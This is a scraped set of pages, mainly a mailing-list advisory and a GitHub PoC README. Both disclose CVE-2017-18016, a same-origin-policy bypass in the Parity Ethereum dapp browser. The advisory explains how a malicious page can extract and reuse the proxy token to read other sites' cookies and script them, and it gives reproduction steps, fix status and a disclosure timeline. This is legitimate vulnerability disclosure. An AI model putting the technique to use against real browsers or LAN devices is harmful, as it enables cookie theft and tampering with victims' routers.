[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.openwall.com_a5c07dc2_20250124_170228.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2018/01/09/8) [[next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <000101d389a5$76acc680$64065380$@oststrom.com>
Date: Wed, 10 Jan 2018 00:56:27 +0100
From: "oststrom \(public\)" <pub@...strom.com>
To: <oss-security@...ts.openwall.com>
Subject: CVE-2017-18016 - Paritytech Parity Ethereum built-in Dapp Browser <= v1.6.10  webproxy token reuse same-origin policy bypass

VuNote
======

Author:     <github.com/tintinweb>
Ref:        <https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-18016>
[5]
Version:    0.3
Date:       Jun 16th, 2017

Tag:        parity same origin policy bypass webproxy token reuse

Overview
--------

Name:           parity
Vendor:         paritytech
References:     * <https://parity.io/> [1]

Version:        1.6.8
Latest Version: 1.7.12 (stable) - fixed
                1.8.5 (beta) - fixed
Other Versions: <= 1.6.10 (stable) - vulnerable
Platform(s):    cross
Technology:     rust js

Vuln Classes:   CWE-346
Origin:         local (remote website, malicious dapp)
Min. Privs.:    ---

CVE:            CVE-2017-18016

Description
---------

quote website [1]

>Parity Technologies is proud to present our powerful new Parity Browser.
Integrated directly into your Web browser, Parity is the fastest and most
secure way of interacting with the Ethereum network.

Summary
-------

PoC: <https://tintinweb.github.io/pub/pocs/cve-2017-18016/> [4]

> Parity Browser <=1.6.8 allows remote attackers to bypass the Same Origin
Policy and obtain sensitive information by requesting other websites via the
Parity web proxy engine (reusing the current website's token, which is not
bound to an origin).

![parity cookie](sop_cookie.gif)

**(A)** Ethereum Parity's built-in dapp/web-browsing functionality is
rendering browser same-origin policy (SOP) ineffective by proxying
requests with the parity main process. As a result, any website
navigated to ends up being origin http://localhost:8080. This also means
that all websites navigated to share the same origin and thus are not
protected by the browser SOP allowing any proxied website/dapp to access
another proxied website/dapp's resources (Cookies, ...).

//see attached PoC - index.html / PoC

![parity frame](sop_frame.gif)

**(B)** Worse, due to the structure of proxy cache urls and the fact that
they
contain a reusable non-secret non-url specific cache-token it is
possible for one proxied website/dapp to navigate to any other proxied
website/dapp gaining full script/XHR control due to **(A)** the SOP being
applied without any restrictions. This could allow a malicious
website/dapp to take control of another website/dapp, performing user
interactions, XHR or injecting scripts/DOM elements to mislead the
user or to cause other unspecified damage.

When navigating to a website with the built-in parity webbrowser a webproxy
request
token is requested and sent along an encoded request for an url. For
example, navigating
parity to <http://oststrom.com> the url gets turned into a proxy url like
http://127.0.0.1:8080/web/8X4Q4EBJ71SM2CK6E5AQ6YBNB4NPGX3ME0X2YBVFEDT76X3JDX
PJWRVFDM of
the form http://127.0.0.1:8080/web/[base32_encode(token+url)]. A malicious
dapp can use
this information to decode its own url, extract the token and reuse it for
any other
url as the token is not locked to the url. The PoC exploits this in order to
load any
other website into a same-origin iframe by reusing the proxy token.

Code see [2]

//see attached PoC - index.html / PoC
//see github [5] for details

Proof of Concept
----------------

Prerequisites:

* (if hosted locally) modify /etc/hosts to resolve your testdomain to your
webserver
* make `index.html` accessible on a webserver (e.g. `cd /path/to/index.html;
python -m SimpleHTTPServer 80`)

1. launch parity, navigate to the built-in webbrowser
(http://127.0.0.1:8180/#/web)
2. navigate the built-in parity webbrowser to where the PoC `index.html` is
hosted (e.g. [4])
3. follow the instructions.
4. Issue 1: navigate to some websites to have them set cookies, reload the
PoC page and click "Display Cookies". Note that while the main request is
proxied by parity, subsequent calls might not be (e.g. xhr, resources). That
means you'll only see cookies set by the main site as only the initial call
shares the origin `localhost:8080`.
5. Issue 2: enter an url into the textbox and hit `Spawn SOP Iframe`. A new
iframe will appear on the bottom of the page containing the proxied website.
Note that the calling website has full script/dom/xhr access to the proxied
target. You can also use the "Display Cookies" button from Issue 1 to show
cookies that have been merged into the origin by loading the proxied iframe.
6. Demo 2: Just a PoC to find local-lan web interfaces (e.g. your gateways
web interface) and potentially mess with its configuration (e.g. router with
default password on your lan being reconfigured by malicious dapp that
excploits the token reuse issue 2)

Fix
-----

* Commit [3] (first in 1.7.0)
* Does not fix Issue #1 - sites are generally put into same origin due to
proxy
* Fixes Issue #2 - Token Reuse
* Parity now added a note that browsing websites with their browser is
insecure

![parity fixed](v1712.png)

* Issue #1 is not yet fixed as the cookie of instagram.com is still shown.
* Parity v1.7.12 added a note.

References
----------

[1] <https://parity.io/>
[2]
<https://github.com/paritytech/parity/blame/e8b418ca03866fd952d456830b30e9225>
c81035a/dapps/src/web.rs
[3]
<https://github.com/paritytech/parity/commit/53609f703e2f1af76441344ac3b72811>
c726a215
[4] <https://tintinweb.github.io/pub/pocs/cve-2017-18016/>
[5] <https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-18016>

Contact
-------

<https://github.com/tintinweb>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_278fbc2e_20250124_170232.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftintinweb%2Fpub%2Ftree%2Fmaster%2Fpocs%2Fcve-2017-18016)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftintinweb%2Fpub%2Ftree%2Fmaster%2Fpocs%2Fcve-2017-18016)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=tintinweb%2Fpub)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[tintinweb](/tintinweb)
/
**[pub](/tintinweb/pub)**
Public

* [Notifications](/login?return_to=%2Ftintinweb%2Fpub) You must be signed in to change notification settings
* [Fork
  125](/login?return_to=%2Ftintinweb%2Fpub)
* [Star
   258](/login?return_to=%2Ftintinweb%2Fpub)

* [Code](/tintinweb/pub)
* [Issues
  0](/tintinweb/pub/issues)
* [Pull requests
  0](/tintinweb/pub/pulls)
* [Actions](/tintinweb/pub/actions)
* [Projects
  0](/tintinweb/pub/projects)
* [Wiki](/tintinweb/pub/wiki)
* [Security](/tintinweb/pub/security)
* [Insights](/tintinweb/pub/pulse)

Additional navigation options

* [Code](/tintinweb/pub)
* [Issues](/tintinweb/pub/issues)
* [Pull requests](/tintinweb/pub/pulls)
* [Actions](/tintinweb/pub/actions)
* [Projects](/tintinweb/pub/projects)
* [Wiki](/tintinweb/pub/wiki)
* [Security](/tintinweb/pub/security)
* [Insights](/tintinweb/pub/pulse)

## Files

 master
## Breadcrumbs

1. [pub](/tintinweb/pub/tree/master)
2. /[pocs](/tintinweb/pub/tree/master/pocs)
/
# cve-2017-18016

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/tintinweb/pub/commits/master/pocs/cve-2017-18016) master
## Breadcrumbs

1. [pub](/tintinweb/pub/tree/master)
2. /[pocs](/tintinweb/pub/tree/master/pocs)
/
# cve-2017-18016

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/tintinweb/pub/tree/master/pocs) | | |
| [Readme.md](/tintinweb/pub/blob/master/pocs/cve-2017-18016/Readme.md "Readme.md") | | [Readme.md](/tintinweb/pub/blob/master/pocs/cve-2017-18016/Readme.md "Readme.md") |  |  |
| [index.html](/tintinweb/pub/blob/master/pocs/cve-2017-18016/index.html "index.html") | | [index.html](/tintinweb/pub/blob/master/pocs/cve-2017-18016/index.html "index.html") |  |  |
| [sop\_cookie.gif](/tintinweb/pub/blob/master/pocs/cve-2017-18016/sop_cookie.gif "sop_cookie.gif") | | [sop\_cookie.gif](/tintinweb/pub/blob/master/pocs/cve-2017-18016/sop_cookie.gif "sop_cookie.gif") |  |  |
| [sop\_frame.gif](/tintinweb/pub/blob/master/pocs/cve-2017-18016/sop_frame.gif "sop_frame.gif") | | [sop\_frame.gif](/tintinweb/pub/blob/master/pocs/cve-2017-18016/sop_frame.gif "sop_frame.gif") |  |  |
| [v171.png](/tintinweb/pub/blob/master/pocs/cve-2017-18016/v171.png "v171.png") | | [v171.png](/tintinweb/pub/blob/master/pocs/cve-2017-18016/v171.png "v171.png") |  |  |
| View all files | | |

## [Readme.md](#readme)

# VuNote

```
Author:     <github.com/tintinweb>
Ref:        https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-18016
Version:    0.3
Date:       Jun 16th, 2017

Tag:        parity same origin policy bypass webproxy token reuse

```

## Overview

```
Name:           parity
Vendor:         paritytech
References:     * https://parity.io/ [1]

Version:        1.6.8
Latest Version: 1.7.12 (stable) - fixed
                1.8.5 (beta) - fixed
Other Versions: <= 1.6.10 (stable) - vulnerable
Platform(s):    cross
Technology:     rust js

Vuln Classes:   CWE-346
Origin:         local (remote website, malicious dapp)
Min. Privs.:    ---

CVE:            CVE-2017-18016

```

## Description

quote website [1]

> Parity Technologies is proud to present our powerful new Parity Browser. Integrated directly into your Web browser, Parity is the fastest and most secure way of interacting with the Ethereum network.

## Summary

PoC: <https://tintinweb.github.io/pub/pocs/cve-2017-18016/> [4]

> Parity Browser <=1.6.8 allows remote attackers to bypass the Same Origin Policy and obtain sensitive information by requesting other websites via the Parity web proxy engine (reusing the current website's token, which is not bound to an origin).

[![parity cookie](/tintinweb/pub/raw/master/pocs/cve-2017-18016/sop_cookie.gif)](/tintinweb/pub/blob/master/pocs/cve-2017-18016/sop_cookie.gif)

**(A)** Ethereum Parity's built-in dapp/web-browsing functionality is

rendering browser same-origin policy (SOP) ineffective by proxying
requests with the parity main process. As a result, any website
navigated to ends up being origin <http://localhost:8080>. This also means
that all websites navigated to share the same origin and thus are not
protected by the browser SOP allowing any proxied website/dapp to access
another proxied website/dapp's resources (Cookies, ...).

//see attached PoC - index.html / PoC

[![parity frame](/tintinweb/pub/raw/master/pocs/cve-2017-18016/sop_frame.gif)](/tintinweb/pub/blob/master/pocs/cve-2017-18016/sop_frame.gif)

**(B)** Worse, due to the structure of proxy cache urls and the fact that they
contain a reusable non-secret non-url specific cache-token it is
possible for one proxied website/dapp to navigate to any other proxied
website/dapp gaining full script/XHR control due to **(A)** the SOP being
applied without any restrictions. This could allow a malicious
website/dapp to take control of another website/dapp, performing user
interactions, XHR or injecting scripts/DOM elements to mislead the
user or to cause other unspecified damage.

When navigating to a website with the built-in parity webbrowser a webproxy request
token is requested and sent along an encoded request for an url. For example, navigating
parity to <http://oststrom.com> the url gets turned into a proxy url like <http://127.0.0.1:8080/web/8X4Q4EBJ71SM2CK6E5AQ6YBNB4NPGX3ME0X2YBVFEDT76X3JDXPJWRVFDM> of
the form [http://127.0.0.1:8080/web/[base32\_encode(token+url)]](http://127.0.0.1:8080/web/%5Bbase32_encode%28token%2Burl%29%5D). A malicious dapp can use
this information to decode its own url, extract the token and reuse it for any other
url as the token is not locked to the url. The PoC exploits this in order to load any
other website into a same-origin iframe by reusing the proxy token.

Code see [2]

//see attached PoC - index.html / PoC

## Proof of Concept

Prerequisites:

* (if hosted locally) modify /etc/hosts to resolve your testdomain to your webserver
* make `index.html` accessible on a webserver (e.g. `cd /path/to/index.html; python -m SimpleHTTPServer 80`)

1. launch parity, navigate to the built-in webbrowser (<http://127.0.0.1:8180/#/web>)
2. navigate the built-in parity webbrowser to where the PoC `index.html` is hosted (e.g. [4])
3. follow the instructions.
4. Issue 1: navigate to some websites to have them set cookies, reload the PoC page and click "Display Cookies". Note that while the main request is proxied by parity, subsequent calls might not be (e.g. xhr, resources). That means you'll only see cookies set by the main site as only the initial call shares the origin `localhost:8080`.
5. Issue 2: enter an url into the textbox and hit `Spawn SOP Iframe`. A new iframe will appear on the bottom of the page containing the proxied website. Note that the calling website has full script/dom/xhr access to the proxied target. You can also use the "Display Cookies" button from Issue 1 to show cookies that have been merged into the origin by loading the proxied iframe.
6. Demo 2: Just a PoC to find local-lan web interfaces (e.g. your gateways web interface) and potentially mess with its configuration (e.g. router with default password on your lan being reconfigured by malicious dapp that excploits the token reuse issue 2)

//tested with latest chrome

## Notes

* Commit [3] (first in 1.7.0)
* Does not fix Issue #1 - sites are generally put into same origin due to proxy
* Fixes Issue #2 - Token Reuse
* Parity now added a note that browsing websites with their browser is insecure

[![parity fixed](/tintinweb/pub/raw/master/pocs/cve-2017-18016/v171.png)](/tintinweb/pub/blob/master/pocs/cve-2017-18016/v171.png)

* Issue #1 is not yet fixed as the cookie of instagram.com is still shown.
* Parity v1.7.12 added a note.

## Timeline

```
31.05.2017 - first contact, forwarded to parity
17.06.2017 - provided PoC
19.06.2017 - response: not critical issue due to internal browser being a dapp browser and not a generic web browser
20.06.2017 - provided more information
21.06.2017 - response: not critical issue due to internal browser being a dapp browser and not a generic web browser
21.06.2017 - response: follow-up - looking into means to lock the token to a website
22.06.2017 - fix ready [3]
10.01.2018 - public disclosure

```

## References

```
[1] https://parity.io/
[2] https://github.com/paritytech/parity/blame/e8b418ca03866fd952d456830b30e9225c81035a/dapps/src/web.rs
[3] https://github.com/paritytech/parity/commit/53609f703e2f1af76441344ac3b72811c726a215
[4] https://tintinweb.github.io/pub/pocs/cve-2017-18016/

```

## Contact

```
https://github.com/tintinweb

```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2c4ebac8_20250124_170231.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenethereum%2Fparity-ethereum%2Fcommit%2F53609f703e2f1af76441344ac3b72811c726a215)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenethereum%2Fparity-ethereum%2Fcommit%2F53609f703e2f1af76441344ac3b72811c726a215)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=openethereum%2Fparity-ethereum)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Nov 6, 2020. It is now read-only.

[openethereum](/openethereum)
/
**[parity-ethereum](/openethereum/parity-ethereum)**
Public archive

* [Notifications](/login?return_to=%2Fopenethereum%2Fparity-ethereum) You must be signed in to change notification settings
* [Fork
  1.7k](/login?return_to=%2Fopenethereum%2Fparity-ethereum)
* [Star
   6.8k](/login?return_to=%2Fopenethereum%2Fparity-ethereum)

* [Code](/openethereum/parity-ethereum)
* [Issues
  130](/openethereum/parity-ethereum/issues)
* [Pull requests
  31](/openethereum/parity-ethereum/pulls)
* [Actions](/openethereum/parity-ethereum/actions)
* [Projects
  0](/openethereum/parity-ethereum/projects)
* [Security](/openethereum/parity-ethereum/security)
* [Insights](/openethereum/parity-ethereum/pulse)

Additional navigation options

* [Code](/openethereum/parity-ethereum)
* [Issues](/openethereum/parity-ethereum/issues)
* [Pull requests](/openethereum/parity-ethereum/pulls)
